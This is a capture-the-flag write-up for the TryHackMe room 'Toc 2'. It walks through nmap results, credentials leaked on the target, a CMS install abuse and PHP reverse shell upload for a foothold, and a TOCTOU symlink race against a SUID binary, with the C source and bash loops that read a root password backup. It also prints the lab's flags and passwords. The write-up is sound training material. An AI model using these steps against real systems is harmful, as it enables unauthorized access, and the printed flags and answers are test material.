# Tryhackme.com Room : Toc 2
`https://tryhackme.com/room/toc2`



## Instance

```
export IP=10.10.242.180
```

## Nmap

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 84:4e:b1:49:31:22:94:84:83:97:91:72:cb:23:33:36 (RSA)
|   256 cc:32:19:3f:f5:b9:a4:d5:ac:32:0f:6e:f0:83:35:71 (ECDSA)
|_  256 bd:d8:00:be:49:b5:15:af:bf:d5:85:f7:3a:ab:d6:48 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
| http-robots.txt: 1 disallowed entry
|_/cmsms/cmsms-2.1.6-install.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site Maintenance
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We find a static page on port `80` with the following text :

```
Under Construction!

Sorry for the inconvenience but management have once again asked for more than we can deliver.

The web server isn't going to be ready for the web dev team to build on for another few days. Just in case anyone around here except me wants to do anything: cmsmsuser:devpass

— Hunter
```

Let's enumerate directory with `gobuster`



Looking at `/robots.txt` we find :

```
User-agent: *
Disallow: /cmsms/cmsms-2.1.6-install.php
 
Note to self:
Tommorow, finish setting up the CMS, and that database, cmsmsdb, so the site's ready by Wednesday.    
```



We browse `/cmsms` and find that there is only the `cmsms-2.1.6-install.php` and a `README`.

When browsing `cmsms-2.1.6-install.php` we are greeted with the install process for `CMS made simple 2.1.6`



For some reason it's super slow tho... Annoyingly slow.

Anyhow, let's enable the advanced mode and proceed.



We already got the database infos :

```
Db name : cmsmsdb
user : cmsmsuser
pass: devpass
```

We do the installation process and create the user 

```
admin:adminadmin
with the email
admin@toc.thm
```

Hmm for some reason, the install didn't work. Maybe a file permission issue ?

I restarted the install but this time I disabled the `sample content` and the `email account detail` option. Maybe it's because the box doesn't have internet access so it can't retrieve sample content ?

Anyhow, we login in the admin panel at `/cmsms/admin` and we go in `content -> File manager`.

We upload a php reverse shell we can access it via `/cmsms/uploads/shell.php`

And we got a revshell as `www-data`.

We retrieve `/home/frank/user.txt` :

```
thm{63616d70657276616e206c696665}
```



## Priv Esc

We find `/home/frank/new_machine.txt` :

```
I'm gonna be switching computer after I get this web server setup done. The inventory team sent me a new Thinkpad, the password is "password". It's funny that the default password for all the work machines is something so simple...Hell I should probably change this one from it, ah well. I'm switching machines soon- it can wait.
```

So we just `su frank` and use the password `password`... oh well

We add our `ssh` pub key in `/home/frank/.ssh/authorized_keys` so that we have an easy way in but we didn't really need it since we got the password for `frank` oh well.. anyhow, let's continue.



We find a folder named `/home/frank/root_access` which contain a binary with `SUID` and the `C` code for it :

```c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {
    int file_data; char buffer[256]; int size = 0;

    if(argc != 2) {
        printf("Binary to output the contents of credentials file \n ./readcreds [file] \n"); 
        exit(1);
    }

    if (!access(argv[1],R_OK)) {
            sleep(1);
            file_data = open(argv[1], O_RDONLY);
    } else {
            fprintf(stderr, "Cannot open %s \n", argv[1]);
            exit(1);
    }

    do {
        size = read(file_data, buffer, 256);
        write(1, buffer, size);
    }

    while(size>0);
}
```

So here `access` check if the `real UID & GID` of the calling user can read the file (`open` will allow access using the `effective ID`)



I found infos here : `https://0x00sec.org/t/how-to-pwned-nebula-level10-access-race-condition/1693`

The trick here is to create a symlink to a file that we own and constantly switch the symlink to point between the file we want to read and the file that we own :

```bash
while true; do
	ln -sf /home/frank/root_access/good_file /home/frank/root_access/to_read
	ln -sf /home/frank/root_access/root_password_backup /home/frank/root_access/to_read
done
```

This can create a race condition where `access` is called when `to_read` -> `good_file` but open is called when `to_read` -> `root_password_backup`.

We just leave this loop running in the background and run :

```
while true; do
	/home/frank/root_access/readcreds /home/frank/root_access/to_read
done
```

We get a bunch of access denied but we sometime get read access

We get the root password :

```
root:aloevera
```



After that we can `su root` and retrieve `/root/root.txt`:

```
thm{7265616c6c696665}
```



## Wrap up

* The foothold was super easy except for the part where we had to wait an eternity since the box is soo slow (Might be to make the race condition happen more often ?)
* The race condition part was interesting. 
  * Can be usefull when we have a binary that have more reading rights than the current user and the reading path is parametrable.
  * Apparently these race vulnerability are called `TOCTOU` -> `Time of Check - Time of Use` 